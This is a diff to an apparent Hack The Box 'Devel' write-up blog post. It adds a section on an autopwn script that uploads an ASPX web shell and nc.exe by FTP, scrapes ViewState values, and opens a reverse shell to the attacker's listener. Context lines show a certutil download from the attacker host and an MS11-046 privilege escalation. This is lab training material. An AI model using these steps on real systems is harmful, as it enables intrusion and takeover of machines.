@@ -149,6 +149,54 @@ sudo rlwrap -cAr nc -nlvp 443
 <img src="{{ site.img_path }}/devel_writeup/Devel_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br /><br />
 
+With the help of the **[Hack4u](https://hack4u.io/){:target="_blank"}** community, I was able to take the opportunity of the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab to automate the **Engagement** of the box. I found on the internet the `python` library (**[ftplib](https://docs.python.org/es/3.13/library/ftplib.html){:target="_blank"}**) that has all the necessary functions to load the two malicious files I need later to access the machine (`cmdasp.aspx`, `nc.exe`). I perform a successful test that they are being loaded on the server.
+
+```bash
+nvim autopwn_ftp.py
+ftp 10.129.97.120
+  dir
+python3 autopwn_ftp.py 10.129.97.120 test test
+  dir         # :)
+```
+
+<br />
+<img src="{{ site.img_path }}/devel_writeup/Devel_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<br />
+<img src="{{ site.img_path }}/devel_writeup/Devel_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<br /><br />
+
+The second part of the script must send the request by **POST** with the malicious command to execute, but I must first keep in mind to leak the values of the parameters **__VIEWSTATE** and **__EVENTVALIDATION** that I can obtain with the `python` **re** library. Then I perform the execution of a command and analyze what values are sent in the **POST** request, to know all the parameters and the respective values that I must encode in the **autopwn**. Once all the changes are done I open port **443** with `nc` and run the autopwn to get the **Reverse Shell**.
+
+> The **ViewState** is a parameter specific to the **ASP.NET** framework, it's used as a breadcrumb trail when the user navigates the application preserving values and controls between different web pages.
+
+> **Event Validation** ensures that events raised on the client originate from the controls rendered by **ASP.NET**.
+
+```bash
+http://10.129.97.120/cmdasp.aspx
+# __VIEWSTATE   __EVENTVALIDATION
+
+python3 autopwn_ftp.py 10.129.97.120 test test
+  l
+  print(r.text)
+  re.findall(r'__VIEWSTATE" value="(.*?)"', r.text)
+  re.findall(r'__VIEWSTATE" value="(.*?)"', r.text)[0]
+  re.findall(r'__EVENTVALIDATION" value="(.*?)"', r.text)[0]
+
+nvim autopwn_ftp.py
+sudo rlwrap -cAr nc -nlvp 443
+python3 autopwn_ftp.py 10.129.97.120 10.10.14.77 443
+```
+
+<br />
+<img src="{{ site.img_path }}/devel_writeup/Devel_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<br />
+<img src="{{ site.img_path }}/devel_writeup/Devel_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<br />
+<img src="{{ site.img_path }}/devel_writeup/Devel_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<br />
+<img src="{{ site.img_path }}/devel_writeup/Devel_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<br /><br />
+
 With the first system enumeration tasks, I check what privileges and permissions the compromised user has, he has the **SeImpersonatePrivilege** enabled so I think about the **ohpe** **[JuicyPotato](https://github.com/ohpe/juicy-potato){:target="_blank"}** exploit. Unfortunately I can't get the binary to work once I transfer it to the target machine. At the beginning of the post is that if it does not work and one is stubborn in trying to exploit a vulnerability (<ins>that's what happened to me</ins>), one can lose a lot of time and not understand that there may be other ways and you can continue to enumerate.
 
 > **Victime Machine**:
@@ -178,11 +226,11 @@ certutil.exe -f -urlcache -split http://10.10.14.84/JP.exe JP.exe
 ```
 
 <br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br /><br />
 
 If I continue with the enumeration, I check with `systeminfo` that the **OS version** is very old and if I search in **ExploitDB** some exploit for this version I find one that **[exploits the MS11-046 vulnerability](https://www.exploit-db.com/exploits/40564){:target="_blank"}**, but the one in its database needs to be compiled and many times it is a **headache** to do this task. Good thing I found a **[ms11-046.exe](https://github.com/abatchy17/WindowsExploits){:target="_blank"}** exploit on **Github** that has the executable ready to download, I just need to download it, transfer it to the target machine and run it to **Escalate privileges**. Once I take full control of the box I can see the contents of the flags I need to enter on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform.
@@ -213,19 +261,19 @@ whoami
 ```
 
 <br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br /><br />
 
 > Another great **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine that was nice to engage as I was able to practice some methods a bit forgotten in the exploitation phase. But what I also take away from this box as a great teaching, is that **I must not take anything for granted**, and avoid that when looking for attack vectors my mind does not just stick with what I already know, I must force it to **get out of the comfort zone** and think outside the box or tray harder the enumeration phase. I'm going to kill the box and move on to the next one, here I go.
 
 <br /><br />
-<img src="{{ site.img_path }}/devel_writeup/Devel_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
+<img src="{{ site.img_path }}/devel_writeup/Devel_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br />
